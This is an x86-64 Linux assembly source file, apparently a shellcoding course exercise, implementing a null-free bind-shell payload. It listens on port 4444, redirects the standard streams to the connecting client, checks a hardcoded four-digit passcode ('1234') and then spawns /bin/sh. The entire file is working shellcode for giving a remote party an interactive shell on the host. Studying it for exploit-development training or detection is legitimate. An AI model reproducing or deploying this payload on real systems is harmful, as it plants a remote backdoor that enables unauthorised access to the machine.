; David @InfinitelyManic
; Code provided/inspired by http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
; bind shell w/ passcode

section .text
        global _start

_start:
        ; man 2 syscall
        ;  x86_64        rdi   rsi   rdx   r10   r8    r9    -

        ; socket(int domain, int type, int protocol);

        ; domain argument specifies communication domain; this selects protocol family
        ;  AF_INET IPv4 Internet protocols

        ; type, which specifies the communication semantics
        ; SOCK_STREAM

        ; socket = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

        ;xor eax, eax            ; init rax
        ;add al, 41              ; syscall
	push byte 41
	pop rax

;        xor edi, edi
 ;       add di, 2
	push byte 2
	pop rdi

       ; xor esi, esi
       ; inc rsi                 ; type
	push byte 1
	pop rsi
	xor edx, edx            ; proto
        syscall

        ; socket descriptor returned in rax
        ; copy socket descriptor to rdi for future use
        mov rdi, rax            ; save sockfd


        ; struct sockaddr...
        ; set up data structure on stack
        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)
        xor eax, eax                            ; init eight bytes to 0
        push rax                                ; 0x0000 0000 0000 0000
        mov dword [rsp-4], eax                  ; 0x0000 0000
        mov word [rsp-6], 0x5c11                ; 0x     5c11 0000 port 4444 in network byte order = 0x115c
        mov word [rsp-8], -1                     ; 0xffff
        add word [rsp-8], 3                      ; -1 + 3  = 2 = domain
        sub rsp, 8                              ; 0x0000 0000 5c11 0002 - top of stack

        ; bind - bind a name to a socket
        ; bind(sockfd, (struct sockaddr *)&server, sockaddr_len)
        ;      rdi      rsi                        rdx
        ; syscall number 49
;        xor eax, eax
 ;       mov al, 49                              ; syscall bind
	push byte 49
	pop rax
        ; rdi                                   ; sockfd
        mov rsi, rsp                            ; 0x0000 0000 5c11 0002
	push byte 16
	pop rdx
;        xor edx, edx
 ;       mov dl, 16                              ; length of ?
        syscall


        ; listen(sock, MAX_CLIENTS)
        ; syscall number 50
;        xor eax, eax
 ;       mov al, 50                              ; syscall listen
	push byte 50
	pop rax
        ; rdi                                   ; sockfd
        ;xor esi, esi
        ;add si, 2
	push byte 2
	pop rsi
        syscall
        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ;              rdi    rsi                        rdx
        ; syscall number 43
;        xor eax, eax
 ;       mov al, 43                              ; syscall accept
	push byte 43
	pop rax
        sub rsp, 16                             ; ?
        ; rdi                                   ; sockfd
        mov rsi, rsp                            ; saving?
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

        ; store the client socket description
        mov r9, rax

        ; close parent
;        xor eax, eax
 ;       add al, 3
	push byte 3
	pop rax
        syscall

        ; duplicate sockets
        ; int dup2(int oldfd, int newfd);
        ; p2()
        ;The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
        ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
        ; dup2 (new, old)
;        xor eax, eax
 ;       mov al, 33
	push byte 33
	pop rax
        mov rdi, r9             ; oldfd
        xor rsi, rsi		; fd
        syscall


;        xor eax, eax
 ;       mov al, 33
	push byte 33
	pop rax
        ; rdi
;        xor esi, esi            ; newfd = std out
 ;       inc rsi
	push byte 1
	pop rsi			; fd
        syscall


;        xor eax, eax
 ;       mov al, 33
	push byte 33
	pop rax
        ; rdi
;        xor esi, esi
 ;       add si, 2
	push byte 2
	pop rsi			; fd
        syscall

        ; ***************************************************************************************
        ; ************* prompt for passc0de w/o nulls; buffer on stack *************************
        ; rev <<< "Enter 4 digit passcode: " | xxd -c8 -ps
        ; 203a65646f637373
        ; 6170207469676964
        ; 2034207265746e45

        mov rax, 0x203a65646f637373	; buff....
        mov rbx, 0x6170207469676964
        mov rcx, 0x2034207265746e45

        push rax			; LIFO...
        push rbx
        push rcx

	push byte 1
	pop rax				; write syscall 
	mov rdi, r9			; fd
        mov rsi, rsp			; buffer
	push byte 25			; $ echo "Enter 4 digit passcode: " | wc = 25
	pop rdx
	syscall
        ; *******************************************************

        ; *****get passcode **************************************
        xor eax, eax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
        mov rdi, r9                     ; sockfd
        mov rsi, rsp                    ; buffer - put it on the stack
        ;xor rdx, rdx
        ;mov dl, 4                       ; len
	push byte 4
	pop rdx				; len
;       the items below are for using recvfrom | recvmsg
;       xor rcx, rcx                    ; flags
;       xor r8, r8                      ; null
;       xor r9,r9                       ; 0
        syscall
        ; ********check passc0de **************************************:
        mov eax, dword [rsp]
        cmp eax, 0x34333231             ; passcode 1234 in ASCII backwards
        je _shell
        ; ***************************************************************************************
        ; ***************************************************************************************


_exit:
        ; _exit if wrong passcode ; alternatively, continue to ask for passcode
;        xor eax, eax
 ;       mov al, 60
	push byte 60
	pop rax
        xor edi, edi
        syscall
        ; *******************************************************

_shell:

        ; execve *************************************
        ; First NULL push
        xor eax, eax
        push rax

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI
        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
